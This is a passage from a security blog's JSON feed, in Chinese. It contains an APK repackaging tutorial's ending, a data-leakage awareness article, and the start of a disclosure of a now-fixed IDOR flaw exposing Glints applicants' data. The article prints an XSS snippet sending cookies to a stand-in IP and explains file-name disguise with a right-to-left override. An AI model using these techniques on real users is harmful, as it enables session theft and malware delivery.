<span class=\"token number\">4</span> demoapp2.apk demoapp2-aligned.apk<br><br><span class=\"token comment\"># sign</span><br>apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --out demoapp2-final.apk demoapp2-aligned.apk<br>adb <span class=\"token function\">install</span> demoapp2-final.apk</code></pre>\n<p>跑完 script 以後打開 app，沒意外的話你就會看見字已經被我們改掉了：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p6-apk2.png\" alt=\"\"></p>\n<p>沒錯，修改一個單純的 app 就是這麼簡單。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>在這篇文章中我們學習了一些 Android 開發的基礎，也利用了 Apktool 將 apk 拆開，看見裡面的 resources 檔案，並且將其改造過後重新包回 apk 檔，安裝到手機上，做出了一個修改版的 app。</p>\n<p>如果只是要改文字這些資源的話，就是這麼容易，但如果要改程式碼的話就相對麻煩許多。</p>\n<p>在下一篇中，我們會來學習如何把 smali 還原成 Java code，以及如何修改 smali 程式碼。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a> - 你在這篇</li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n",
      "date_published": "2022-02-21T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/data-leakage/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/data-leakage/",
      "title": "防駭客的基本認知: 資料保護",
      "content_html": "<p><img src=\"/img/posts/nick/data-leakage/dl_1.png\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>駭客從攻擊中收集與整理出有用的資料是很花時間的，如果沒有把這些資料換成錢駭客也是會餓死，所以這篇文章以謀利的角度，舉一些常見的例子來說明駭客如何利用外流的資料與對應的影響，但想不在網路上留下任何資料非常困難，所以文章最後也會提供一些防範方式與建議供大家參考。</p>\n<!-- summary -->\n<hr>\n<h2 id=\"%E7%B6%B2%E8%B7%AF%E4%B8%8A%E5%B8%B8%E5%A4%96%E6%B5%81%E7%9A%84%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E8%B7%AF%E4%B8%8A%E5%B8%B8%E5%A4%96%E6%B5%81%E7%9A%84%E8%B3%87%E6%96%99\">#</a> 網路上常外流的資料</h2>\n<p>先假設世界充滿惡意，拿到個人資料都是為了惡意用途，但很多狀況下不得不留下資料，最常見就是申請帳號才能使用的服務，申請帳號有一堆必填的欄位，個人資料就這樣拱手讓人。</p>\n<p>除了個資之外，還有一些系統資訊常常在不自覺的狀況下外流，最常見的就是 Google 提供的廣告，當你發現網路上跳出的廣告其內容與你越來越相關，甚至在一些外文的網站看到中文廣告時，代表你的資料早已外流，大家都認識你了 ! 而且隨著外流的資訊量越多廣告也會越加精準。</p>\n<p>綜上所述外流的資料可分為 2 大類，分別是個人資料與系統資訊，下面列出一些常外流需要注意的資料。</p>\n<h3 id=\"1.-%E5%80%8B%E4%BA%BA%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#1.-%E5%80%8B%E4%BA%BA%E8%B3%87%E6%96%99\">#</a> 1. 個人資料</h3>\n<ul>\n<li>姓名</li>\n<li>出生日期</li>\n<li>電話</li>\n<li>地址</li>\n<li>電子郵件</li>\n<li>信用卡</li>\n<li>身分證字號</li>\n</ul>\n<h3 id=\"2.-%E7%B3%BB%E7%B5%B1%E8%B3%87%E8%A8%8A\"><a class=\"direct-link\" href=\"#2.-%E7%B3%BB%E7%B5%B1%E8%B3%87%E8%A8%8A\">#</a> 2. 系統資訊</h3>\n<ul>\n<li>IP</li>\n<li>應用程式與版本</li>\n<li>瀏覽資訊</li>\n</ul>\n<hr>\n<h2 id=\"%E5%A4%96%E6%B5%81%E5%BE%8C%E6%9C%83%E7%99%BC%E7%94%9F%E7%94%9A%E9%BA%BC\"><a class=\"direct-link\" href=\"#%E5%A4%96%E6%B5%81%E5%BE%8C%E6%9C%83%E7%99%BC%E7%94%9F%E7%94%9A%E9%BA%BC\">#</a> 外流後會發生甚麼</h2>\n<p><img src=\"/img/posts/nick/data-leakage/dl_2.png\" alt=\"\"></p>\n<p>駭客收集到越多的資訊就能發動強度越高的攻擊，收集到個人資料中的聯絡資訊就能藉由發送廣告或詐騙來獲利，如果要入侵對方的電腦只有聯絡資訊是不夠的，需要更多的系統資訊。</p>\n<p>資料外流的例子有非常多，根據 IC3(FBI 旗下的組織，美國最大的資安通報系統)提供的報告，在 2020 年造成金額損失最多的網路犯罪是 BEC/EAC(透過電子郵件對匯款或付款資訊進行詐騙)，細節可參考之前整理的另一篇文章(<a href=\"https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/\">資安弱點會造成多大損失</a>)，因此這邊除了說明影響之外也以電子郵件為例來說明資料外流後可能會發生的狀況，並且找一個真實案例的新聞來幫助大家了解在現實生活中這些事情如何發生。</p>\n<h3 id=\"%E9%A1%9E%E5%9E%8B-1.-%E5%BB%A3%E5%91%8A%3A\"><a class=\"direct-link\" href=\"#%E9%A1%9E%E5%9E%8B-1.-%E5%BB%A3%E5%91%8A%3A\">#</a> 類型 1. 廣告:</h3>\n<p>不論你今天在任何網站上留下電子郵件訊息，最容易受到影響的就是開始大量收到廣告郵件，因為駭客已經將聯絡資訊賣給電商了。</p>\n<p><strong>實際案例:</strong> 傳駭客以僅1千美金網上兜售5億筆微博用戶個資<br>\n<strong>資料來源:</strong> <a href=\"https://www.ithome.com.tw/news/136487\">https://www.ithome.com.tw/news/136487</a></p>\n<h3 id=\"%E9%A1%9E%E5%9E%8B-2.-%E8%A9%90%E9%A8%99%3A\"><a class=\"direct-link\" href=\"#%E9%A1%9E%E5%9E%8B-2.-%E8%A9%90%E9%A8%99%3A\">#</a> 類型 2. 詐騙:</h3>\n<p>接著駭客拿從電子郵件到 Google 上面查詢，找到你留在網路上的個人訊息，那駭客就會嘗試根據這些資訊設計釣魚郵件，想辦法從你手上騙錢。</p>\n<p><strong>實際案例:</strong> 31億美元不翼而飛的慘痛教訓！企業員工郵件屢遭冒用，引發供應商匯款詐騙事件<br>\n<strong>資料來源:</strong> <a href=\"https://www.ithome.com.tw/news/112812\">https://www.ithome.com.tw/news/112812</a></p>\n<h3 id=\"%E9%A1%9E%E5%9E%8B-3.-%E7%9B%9C%E5%B8%B3%E8%99%9F(%E7%9B%9C%E5%88%B7)%3A\"><a class=\"direct-link\" href=\"#%E9%A1%9E%E5%9E%8B-3.-%E7%9B%9C%E5%B8%B3%E8%99%9F(%E7%9B%9C%E5%88%B7)%3A\">#</a> 類型 3. 盜帳號(盜刷):</h3>\n<p>簡單來說當你外流的資料包含服務類型，駭客們會挑選有利可圖的服務來攻擊.</p>\n<p>很多時候這些服務資訊是間接外流的，舉例來說如駭客找到你的電子郵件後發現你用的是 Gmail，就代表著你有用 Google 的服務，駭客會嘗試登錄你的 Google 帳戶，目標是刷爆你的 Google Pay。</p>\n<p><strong>實際案例:</strong> 有不肖份子收購外洩帳密，嘗試非法登入國內多家電商網購平臺，東森5會員遭盜刷<br>\n<strong>資料來源:</strong> <a href=\"https://www.ithome.com.tw/news/145360\">https://www.ithome.com.tw/news/145360</a></p>\n<h3 id=\"%E9%A1%9E%E5%9E%8B-4.-%E5%85%A5%E4%BE%B5%3A\"><a class=\"direct-link\" href=\"#%E9%A1%9E%E5%9E%8B-4.-%E5%85%A5%E4%BE%B5%3A\">#</a> 類型 4. 入侵:</h3>\n<p>如果你的系統本身有弱點而且被駭客收集到這些資訊，就很可能成為入侵的對象，但更常見另外一種方式是駭客將惡意檔偽裝成一般檔案來騙使用者點擊，像是在網站上提供下載，或者夾帶在電子郵件的附件中，執行後駭客直接就入侵到使用者的電腦，這時候駭客獲利的方式就很多樣了，常見的勒索軟體，殭屍網路，甚至是挖礦都能替駭客賺錢。</p>\n<p>偽裝檔案這件事比想像中簡單很多，而且很容易被忽略，以下圖為例，仔細一點看可以發現這是一個名為 test_lmth.txt 的 html 檔案，但如果沒有特別注意當成文件檔來點擊，就直接連到駭客的網站去了。</p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_3.png\" alt=\"\"></p>\n<p>這個檔案的真實檔名是 <code>&quot;test_\\u202Etxt.html&quot;</code>，但在 Unicode &quot;\\u202E&quot; 本身不會顯示之外會讓後方的文字會倒過來顯示，對系統來說它是 test_txt.html，設計這個顛倒功能的原因是系統為了正確顯示阿拉伯語和希伯來語等從右到左的語言，但駭客卻可藉此來偽裝檔案。</p>\n<p><strong>實際案例:</strong> 散布金融木馬IcedID、Qbot的垃圾郵件攻擊再度出現，在中國、印度等地造成災情<br>\n<strong>資料來源:</strong> <a href=\"https://www.ithome.com.tw/news/145260\">https://www.ithome.com.tw/news/145260</a></p>\n<hr>\n<h2 id=\"%E4%B8%8D%E7%9F%A5%E4%B8%8D%E8%A6%BA%E4%B8%AD%E5%A4%96%E6%B5%81%E7%9A%84%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E4%B8%8D%E7%9F%A5%E4%B8%8D%E8%A6%BA%E4%B8%AD%E5%A4%96%E6%B5%81%E7%9A%84%E8%B3%87%E6%96%99\">#</a> 不知不覺中外流的資料</h2>\n<p><img src=\"/img/posts/nick/data-leakage/dl_4.png\" alt=\"\"></p>\n<p>有一部分外流的資料是使用者主動提供的，像前面提到的為了註冊帳號而提供資料，或者是被釣魚攻擊騙走資料，甚至是服務供應商不小心把資料外流等等，不論是哪一種使用者都至少會有一次提供資料的動作，但有另外一部份的資料是使用者在不自覺的情況下外流出去的，因為前者主要涉及騙術而非技術，這邊會把重點放在後者的說明。</p>\n<h3 id=\"1.-%E7%80%8F%E8%A6%BD%E7%B6%B2%E7%AB%99%3A\"><a class=\"direct-link\" href=\"#1.-%E7%80%8F%E8%A6%BD%E7%B6%B2%E7%AB%99%3A\">#</a> 1. 瀏覽網站:</h3>\n<ul>\n<li>\n<p><strong>Request Header</strong></p>\n<p>其實我們在瀏覽網頁的時候瀏覽器就已經不知不覺留下了很多資料，以 Chrome 為例，這些資料需要按 F12 進入 DevTools 才能看的到，其中有一組在 request header 中的資料 user-agent 原本是用來讓網站知道瀏覽器的版本以提供更好的服務，但網站可以藉此推斷連線者的系統，另外一組 sec-ch-ua 也是一樣，像下圖可以明顯看出系統為 windows 10，其他 header 依據狀況不同也會透漏各種系統資訊。</p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_5.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>瀏覽紀錄</strong></p>\n<p>部分網站除了記錄你的瀏覽資訊之外，還把這些資料送給其他網站，以下圖為例，聯合新聞網把你看過那些新聞告訴了很多人，其中之一是廣告商 Scupio 酷比聯播網，這些資訊也可以在 DevTools 中找到。</p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_6.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>惡意 HTML/JavaScript</strong><br>\n有些網站本身就帶著惡意的程式碼，當使用者進入的或點擊按鍵，資料就會被攻擊者送到特定的地點，下方的程式碼是一個比較常見於 XSS 攻擊的簡單例子，在點進有這段程式碼的頁面時 cookie 內的値就會被駭客傳送到 111.222.333.444 這個 IP，cookie 是很多網站用來識別連線者的一個欄位，如果你在登入 A 網站後 cookie 才被偷走，偷到它的人有很高的機會偽冒你的身份登入 A 網站。</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">></span><br>document<span class=\"token punctuation\">.</span>location<span class=\"token operator\">=</span><span class=\"token string\">'http://111.222.333.444/cookies.php?c='</span> document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">;</span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></code></pre>\n<p>部落格中也有數篇關於 XSS 的文章，有興趣可以進一步看更深入的分析。</p>\n</li>\n</ul>\n<h3 id=\"2.-%E6%94%B6%E4%BF%A1\"><a class=\"direct-link\" href=\"#2.-%E6%94%B6%E4%BF%A1\">#</a> 2. 收信</h3>\n<ul>\n<li><strong>惡意 HTML/JavaScript</strong><br>\n電子郵件接受跟網頁一樣的 html 格式，點開 html 格式信件的行為接近於開啟一個離線的網頁，所以電子郵件也跟網頁一樣會受到&quot;惡意 HTML/JavaScript&quot;所引響，在不經意間外流資料，但前面已經提過就不重複說明。</li>\n</ul>\n<h3 id=\"3.-%E8%87%AA%E6%9E%B6%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#3.-%E8%87%AA%E6%9E%B6%E6%9C%8D%E5%8B%99\">#</a> 3. 自架服務</h3>\n<ul>\n<li>\n<p><strong>網站</strong><br>\n如果有自架的網站，網站也會在你不注意的狀況下透漏相當多資訊，以下圖為例，利用 Chrome 的套件 Wappalyer 可以很簡單的拿到這個網站用了那些服務與版本，駭客透過這些外流的資料往下追，可以會發現 Apache 2.2.26 這是一個相對舊的版本，大約是 2013 年發布的，有較多的弱點可以利用，這些資訊會吸引駭客進一步嘗試或攻擊。</p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_7.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>檔案傳輸</strong><br>\n常見的像是自架的 FTP 伺服器，架完後較少維護，更少去注意資料是否外流，這些檔案傳輸伺服器駭客都找的到，光台灣就有 6 萬多台設備可以直接在網路上被找到，如果沒有做好設定，資料外流的機會非常高。<br>\n<img src=\"/img/posts/nick/data-leakage/dl_8.png\" alt=\"\"></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AD%B7%E8%87%AA%E5%B7%B1\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AD%B7%E8%87%AA%E5%B7%B1\">#</a> 如何保護自己</h2>\n<p><img src=\"/img/posts/nick/data-leakage/dl_9.png\" alt=\"\"></p>\n<p>在這網路世界蓬勃發展的時代，如果因為怕避免資料外流而不敢在網路上留下任何資料，可以說是因噎廢食，但如何保護關鍵資料避免損失 ?</p>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-1%3A-%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-1%3A-%E5%AE%89%E5%85%A8%E6%80%A7%E8%A8%AD%E5%AE%9A\">#</a> 解決方案 1: 安全性設定</h3>\n<p>當 Windows 出現資安問題時，微軟比你還緊張，其他服務也是一樣的道理，為了保護自家產品的安全開發商通常做了很多保護，這也是很多軟體常常會跑更新卻沒感受到新功能的主因，其實更新的是系統防護，但使用者常常不更新甚至還把為了方便把預設開啟的防護關閉，這些防護很多時候比防毒軟體還重要的多，這邊分享一些與資料外流有關的安全性設定，但確實更新也一樣重要。</p>\n<ul>\n<li><strong>瀏覽器(Chrome)</strong>\n<ol>\n<li>安全性與隱私權設定 &gt; 安全瀏覽 &gt; 強化防護</li>\n<li>安全性與隱私權設定 &gt; Cookie 和其他網站資料 &gt; 封鎖第三方 Cookie</li>\n<li>安全性與隱私權設定 &gt; Cookie 和其他網站資料 &gt; 將「不追蹤」要求與瀏覽流量一併送出</li>\n</ol>\n</li>\n<li><strong>電子郵件(Outlook)</strong>\n<ol>\n<li>信任中心設定 &gt; 電子郵件安全性 &gt; 以純文字讀取所有標準郵件</li>\n<li>信任中心設定 &gt; 自動下載 &gt;不自動下載標準 HTML 電子郵件訊息或 RSS 項目中的圖片</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-2%3A-%E9%9B%99%E9%87%8D%E8%A6%81%E7%B4%A0%E9%A9%97%E8%AD%89(2fa)%2F%E5%85%A9%E6%AD%A5%E9%A9%9F%E9%A9%97%E8%AD%89(2sv)\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-2%3A-%E9%9B%99%E9%87%8D%E8%A6%81%E7%B4%A0%E9%A9%97%E8%AD%89(2fa)%2F%E5%85%A9%E6%AD%A5%E9%A9%9F%E9%A9%97%E8%AD%89(2sv)\">#</a> 解決方案 2: 雙重要素驗證(2FA)/兩步驟驗證(2SV)</h3>\n<p>網路上常見的是帳號密碼加上另外一個認證機制，像是登錄時除了帳號密碼之外還需要要一組寄到手機的驗證碼，所就算你帳號密碼被駭客拿到或猜到，沒有連你的手機一起偷走就沒有意義，但這類功能會增加使用者的麻煩，不是每種服務都預設有多重驗證，很多時候需要使用者主動啟用或申請，強烈建議所有與付款有關的服務都要開啟。</p>\n<p>2FA(two-factor authentication) 與 2SV (two-step verification) 的差異在於多出來的驗證類型是否與原本的相同，舉例來說除了原本的帳號密碼之外某服務需要輸入身分證末 4 碼做為第 2 組密碼，但因為本質還是密碼所以只能算是 2SA，如果需要額外加上的是指紋，就能算是 2FA。</p>\n<ul>\n<li>\n<p><strong>Google 帳戶</strong></p>\n<ol>\n<li>帳戶 &gt; 安全性 &gt; 兩步驟驗證</li>\n</ol>\n<p><img src=\"/img/posts/nick/data-leakage/dl_10.png\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-3%3A-%E5%81%87%E5%B8%B3%E8%99%9F\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-3%3A-%E5%81%87%E5%B8%B3%E8%99%9F\">#</a> 解決方案 3: 假帳號</h3>\n<p>目前網路上越來越多服務用電子信箱當帳號，這邊推薦一個相當好用的工具軟體來建立免洗帳號，避免收到垃圾信或者有人嘗試破解你的信箱，這個工具會隨機產生一組可以收信的電子郵件，而且會在 10 分鐘後永久刪除，不用擔心裡面的資料會外流。</p>\n<ul>\n<li>\n<p><strong>10分鐘信箱:</strong><br>\n<a href=\"https://10minutemail.net/\">https://10minutemail.net/</a></p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_11.png\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-4%3A-%E9%98%B2%E8%AD%B7%E8%BB%9F%E9%AB%94\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-4%3A-%E9%98%B2%E8%AD%B7%E8%BB%9F%E9%AB%94\">#</a> 解決方案 4: 防護軟體</h3>\n<p>雖然慢慢開始有些網站會在收集你的資料之前通知你，但還是很多網站偷偷收集你的資料，這邊推薦一個相當好用的 Chrome 套件來幫你阻止一些追蹤，其實這個工具已經在前面的範例中出現過了。</p>\n<ul>\n<li>\n<p><strong>Disconnect:</strong><br>\n<a href=\"https://chrome.google.com/webstore/detail/disconnect/jeoacafpbcihiomhlakheieifhpjdfeo?hl=zh-TW\">https://chrome.google.com/webstore/detail/disconnect/jeoacafpbcihiomhlakheieifhpjdfeo?hl=zh-TW</a></p>\n<p>圖中紅色禁止符號的部分都是已經被擋掉的追蹤，基本原理是移除網頁中一些不影響運作的回傳値。</p>\n<p><img src=\"/img/posts/nick/data-leakage/dl_6.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>Shodan:</strong><br>\n<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></p>\n<p>這工具主要是快速檢查你外流了那些系統資訊，下圖是在 Shodan 的搜索結果之一與用到的指定，可以看到除了系統資訊以外連帳號都外流了。<br>\n<code>port:3389 country:&quot;TW&quot; os:&quot;Windows 7 Professional&quot;</code><br>\n<img src=\"/img/posts/nick/data-leakage/dl_12.png\" alt=\"\"></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p><img src=\"/img/posts/nick/data-leakage/dl_13.png\" alt=\"\"></p>\n<p>很多人在不知不覺中外流了不少資料，卻覺得不痛不癢，覺得駭客不會找上他，其實只是駭客不確定花時間攻擊你能不能得到足夠的回報，就像小偷做案前會先確認目標是不是有錢人 ? 有沒有裝監視器或防盜等等，所以防止資料外流的概念其實很接近現實生活中財不漏白的概念，刻意在路上炫富不一定會有事，但警察一定會建議你不要這樣做，除非你早就做好準備，背後跟著一堆保鑣。</p>\n<p>個人資料中最優先保護的是與付款有關的資料(ex. 信用卡)，如果需要在網路上留下付款資料，最好先確認該服務有沒有支援多要素驗證，雖然多要素驗證多一個步驟使用上比較麻煩，但對駭客來說麻煩更大，多數狀況下是當麻煩到會讓駭客放棄攻擊你的程度，其實這也代表這個防護方式是很有效的。</p>\n<p>系統資料中最優先保護的是 IP，一般用戶預設使用浮動 IP 所以就算外流影響也不大，因為較難靠浮動 IP 連到你的電腦，所以除非你已經做好保護，否則盡量避免為了自架服務而改用固定 IP，讓駭客無法找上門就不用擔心門被攻破。</p>\n<p>網站的話資料外流的方式比較多樣，除了示範的方法之外還有非常多，建議先以自動化的工具進行檢測，優先確認外流的資料是否與已知的高風險弱點有關並修正與弱點有關的問題，如果無法立刻修正想辦法至少把版本資訊藏起來。</p>\n<p>前面為快速說明原理挑了一些簡單易懂的方式來示範，實際上還有更多更進階的用法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。</p>\n",
      "date_published": "2022-02-17T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/how-i-hacked-glints-and-your-resume/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/how-i-hacked-glints-and-your-resume/",
      "title": "關於我在 Glints 找到的高風險漏洞",
      "content_html": "<!-- summary -->\n<!-- 在 2021 年 7 月時我們發現了求職平台 Glints 的四個漏洞，可以讓攻擊者偷走平台上所有求職者的履歷，這篇記錄了漏洞發現的經過以及後續回報的狀況 -->\n<!-- summary -->\n<div data-nosnippet>\n2022-02-10 更新：修正標題為「關於我在 Glints 找到的高風險漏洞」，原標題是「我怎麼從 Glints 手中偷走你的履歷」\n</div>\n<p>Glints 是一間總部位於新加坡的求職平台，2021 年年初的時候才剛拿到 <a href=\"https://www.inside.com.tw/article/23099-glints-c-round\">6.5 億新台幣</a>的投資，在台灣也有團隊負責徵才相關事項。</p>\n<p>在 2021 年 7 月時我發現 Glints 有一個 <a href=\"https://security.glints.com/\">bug bounty program</a>，於是花了一些時間研究一下 Glints 的服務，最後找到了四個漏洞並且回報給了 Glints，這些漏洞可以造成的影響包括：</p>\n<ol>\n<li>查看平台上每一個職缺的所有應徵者資料，包括應徵者的姓名、電話、生日、履歷以及 email</li>\n<li>查看平台上所有 recruiter 的個人資料，包括姓名、職稱、所在的團隊以及 email</li>\n</ol>\n<p>簡單來說，若是被有心人士利用這些漏洞，那基本上所有應徵者的個人資訊都會外洩。</p>\n<p>接著，就讓我們來看看這些漏洞。</p>\n<p>附註：文章所提及的漏洞在回報給 Glints 之後都已經修復。</p>\n<h2 id=\"1.-%E7%80%8F%E8%A6%BD%E8%81%B7%E7%BC%BA%E7%94%B3%E8%AB%8B%E7%9A%84%E6%AC%8A%E9%99%90%E6%8E%A7%E7%AE%A1%E4%B8%8D%E7%95%B6%EF%BC%8C%E5%B0%8E%E8%87%B4%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\"><a class=\"direct-link\" href=\"#1.-%E7%80%8F%E8%A6%BD%E8%81%B7%E7%BC%BA%E7%94%B3%E8%AB%8B%E7%9A%84%E6%AC%8A%E9%99%90%E6%8E%A7%E7%AE%A1%E4%B8%8D%E7%95%B6%EF%BC%8C%E5%B0%8E%E8%87%B4%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\">#</a> 1. 瀏覽職缺申請的權限控管不當，導致使用者資訊洩露</h2>\n<p>Glints 這個平台的使用者基本上分成兩種：雇主跟求職者，以目前來說任何人都可以直接在上面開一個雇主的帳號，只是職缺發布時還是會需要經由系統或人工審核，才會正式公開。</p>\n<p>雇主有個後台可以管理職缺跟來應徵的求職者：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p1-applications.png\" alt=\"portal\"></p>\n<p>而查看應徵者資訊的 API URL 是這樣：<code>/api/recruiterats/jobApplications?where={&quot;JobId&quot;:&quot;55e137a1-f96e-4720-9b08-7eb2749e1557&quot;}</code></p>\n<p>API 返回的部分資訊長這樣：</p>\n<pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><br>    <span class=\"token property\">\"candidate\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"44007523-f7a8-411d-b2c4-57c68a976534\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"profilePic\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"6f14ffc62f3f53d8dcb22a4bfc1da6c8.png\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"firstName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Peter\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"lastName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"劉\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"email\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"abc123@yopmail.com\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"phone\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"+886-999999999\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"resume\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cc042b7400c444619adedf79a9c1daf3.pdf\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"salaryExpectation\"</span><span class=\"token operator\">:</span> <span class=\"token null keyword\">null</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"currencyCode\"</span><span class=\"token operator\">:</span> <span class=\"token null keyword\">null</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"recentJob\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"工程師\"</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"lastSeen\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-07-22T01:58:14.859Z\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"country\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Taiwan\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token property\">\"city\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Taipei\"</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>可以看到裡面有應徵者的姓名、電子郵件、電話跟履歷檔案名稱。</p>\n<p>這時候我做了一件大家都會做的事情，就是把 JobId 換成別間公司的職缺，而 API 照常返回了資料：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p2-idor.png\" alt=\"idor\"></p>\n<p>那我們要怎麼拿到其他職缺的 JobId 呢？很簡單，因為這都是公開的。只要去到給求職者的網頁，就可以直接在 API 或是網址上看到職缺的 ID，像這樣：<a href=\"https://glints.com/tw/opportunities/jobs/consultant/55e137a1-f96e-4720-9b08-7eb2749e1557\">https://glints.com/tw/opportunities/jobs/consultant/55e137a1-f96e-4720-9b08-7eb2749e1557</a></p>\n<p>假設我是攻擊者，就可以寫個腳本透過自動化的方式把 Glints 上所有職缺的 ID 都抓下來，然後再利用上面這個漏洞，就能抓到 Glints 上所有開放的職缺的應徵者資訊。</p>\n<h3 id=\"%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F\">#</a> 修補方式</h3>\n<p>後來 Glints 修正了這個 API，實作了 JobId 的檢查，確認使用者對於 JobId 所屬的公司有存取權限才回傳資料。</p>\n<h2 id=\"2.-%E6%87%89%E5%BE%B5%E8%80%85%E8%B3%87%E8%A8%8A-rss-%E7%9A%84%E6%AC%8A%E9%99%90%E6%8E%A7%E7%AE%A1%E4%B8%8D%E7%95%B6%EF%BC%8C%E5%B0%8E%E8%87%B4%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\"><a class=\"direct-link\" href=\"#2.-%E6%87%89%E5%BE%B5%E8%80%85%E8%B3%87%E8%A8%8A-rss-%E7%9A%84%E6%AC%8A%E9%99%90%E6%8E%A7%E7%AE%A1%E4%B8%8D%E7%95%B6%EF%BC%8C%E5%B0%8E%E8%87%B4%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\">#</a> 2. 應徵者資訊 RSS 